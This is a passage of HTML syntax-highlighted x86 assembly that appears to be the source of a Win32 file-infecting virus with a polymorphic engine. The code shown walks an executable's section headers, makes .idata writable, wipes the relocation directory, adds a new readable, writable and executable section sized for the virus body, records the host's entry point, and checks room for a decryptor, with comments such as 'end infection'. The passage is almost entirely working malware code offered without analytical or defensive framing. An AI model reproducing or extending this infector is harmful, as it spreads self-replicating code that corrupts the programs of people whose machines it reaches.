                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; .bss?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">              </span><span class="sc1">; If not, look next section</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SectionNames</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Save the RVA of the section for</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; later use in the poly engine.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BssSection</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextSection2</span><span class="sc0">          </span><span class="sc1">; Look next section</span><span class="sc0">
</span><span class="sc5">@@LookForIdata</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'adi.'</span><span class="sc0">  </span><span class="sc1">; Does it begin like .idata?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">              </span><span class="sc1">; If not, do next check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'at'</span><span class="sc0"> </span><span class="sc1">; .idata?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">              </span><span class="sc1">; If not, look next section</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">;make it writable (Win98 SE)</span><span class="sc0">
             </span><span class="sc1">;   jmp   @@NextSection               ; If not, per-process fails</span><span class="sc0">
</span><span class="sc5">@@NextSection</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SZSectionNames</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">@@LoopNS_001</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@LoopNS_002</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmpsb</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextNS_001</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopNS_002</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SectionNames</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextNS_002</span><span class="sc0">
        </span><span class="sc5">@@NextNS_001</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopNS_001</span><span class="sc0">
        </span><span class="sc5">@@NextNS_002</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">@@NextSection2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">             </span><span class="sc1">; Next section</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop_001</span><span class="sc0">             </span><span class="sc1">; Repeat it for every section</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; 0? ; Text header found?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End4</span><span class="sc0">                       </span><span class="sc1">; If not, end infection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; Is there .reloc section?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CreateNew</span><span class="sc0">             </span><span class="sc1">; If not, create a new section</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastHeader</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Is the last section the reloc?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End4</span><span class="sc0">                  </span><span class="sc1">; If it isn't, exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0A0h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0A4h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Anulate the fixup directory</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ContinueWithReloc</span><span class="sc0">
  </span><span class="sc5">@@CreateNew</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastHeader</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the last header address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'rsr.'</span><span class="sc0"> </span><span class="sc1">; Is .rsrc?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End4</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'c'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">@@End4</span><span class="sc0">                  </span><span class="sc1">; If it isn't, end infection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SectionNames</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">; Get the last header address</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get the new section address</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@LoopCheckIfHole</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Check if all that space is 0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End4</span><span class="sc0">         </span><span class="sc1">; If not, there isn't space for creating</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; a new section. We check it in all the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">     </span><span class="sc1">; 40 bytes of required space.</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LoopCheckIfHole</span><span class="sc0">

               </span><span class="sc1">; mov     byte ptr [ecx], '.' ; Set the '.' of the name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_SizePOW2</span><span class="sc0"> </span><span class="sc1">; The virtual size</span><span class="sc0">
                                                        </span><span class="sc1">; will be the required</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; The physical address of the section</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; will be the physical address of the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">              </span><span class="sc1">; (before) last section plus its vir-</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; tual size rounded to the section </span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">              </span><span class="sc1">; physical alignment.</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set that address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Set its physical size to</span><span class="sc0">
                                               </span><span class="sc1">; 0 to force its readjustement</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; The RVA of the new section will be</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; the RVA of the last plus its vir-</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; tual size.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0A0000020h</span><span class="sc0"> </span><span class="sc1">; READABLE/WRITABLE/</span><span class="sc0">
                                                        </span><span class="sc1">; /EXECUTABLE</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">; Get the mapping address of this</span><span class="sc0">
                                          </span><span class="sc1">; section</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; Save it here</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Increase the number of sections</span><span class="sc0">
  </span><span class="sc5">@@ContinueWithReloc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the initial RVA of the EXE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">; Add the base address...</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InicIP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; ...and save it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImageBase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Save the base address, too</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the mapped address of the</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">; .text header in the file</span><span class="sc0">
    </span><span class="sc1">; Check if it's big enough to hold a decryptor (physically and virtually)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Host_Data_Size</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@OK_WithtextSize</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Host_Data_Size</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@OK_WithtextSize</span><span class="sc0">
      </span><span class="sc5">@@P_End5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Sav_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End4</span><span class="sc0">
     </span><span class="sc5">@@OK_WithtextSize</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EBX=Virtual address of .text</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EAX=Virtual address of last sect.</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">Host_Data_Size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX=Maximum address where</span><span class="sc0">
                                                  </span><span class="sc1">; the decryptor can reach</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">    </span><span class="sc1">; EDX=Address inside the PE header where</span><span class="sc0">
                                    </span><span class="sc1">; the directories start</span><span class="sc0">
   </span><span class="sc1">;; Now we are going to check if any directory would be inside the decryp-</span><span class="sc0">
   </span><span class="sc1">;; tor and then overwritting the code when automatic data like import RVAs</span><span class="sc0">
   </span><span class="sc1">;; and all that are set by the kernel.</span><span class="sc0">
     </span><span class="sc5">@@LoopDirCheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;Check begin address of .text</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@NextDirCheck</span><span class="sc0">             </span><span class="sc1">; If below, then it's OK</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; Check max address in .text</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@P_End5</span><span class="sc0">                   </span><span class="sc1">; If below, it overwrites the</span><span class="sc0">
                                                 </span><span class="sc1">; decryptor, so finish</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Check RVA of last section</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@P_End5</span><span class="sc0">    </span><span class="sc1">; If it overwrites the encrypted data, end</span><span class="sc0">
     </span><span class="sc5">@@NextDirCheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Next directory</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">          </span><span class="sc1">; End of directories?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LoopDirCheck</span><span class="sc0">      </span><span class="sc1">; If not, loop again</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; Get mapped address of last section header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_SizePOW2</span><span class="sc0">  </span><span class="sc1">; If the virtual size isn't big</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; enough, make it bigger</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@SizeIsOK_1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_SizePOW2</span><span class="sc0">
